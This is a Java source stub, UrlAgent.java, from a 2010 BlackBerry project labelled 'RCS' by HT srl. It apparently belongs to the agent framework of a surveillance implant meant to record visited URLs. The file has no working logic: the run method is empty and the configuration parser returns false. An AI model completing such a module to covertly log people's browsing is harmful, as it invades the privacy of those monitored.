//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : UrlAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class UrlAgent.
 */
public final class UrlAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);

    //#endif

    /**
     * Instantiates a new url agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public UrlAgent(final boolean agentEnabled) {
        super(Agent.AGENT_URL, agentEnabled, true, "UrlAgent");
    }

    /**
     * Instantiates a new url agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected UrlAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
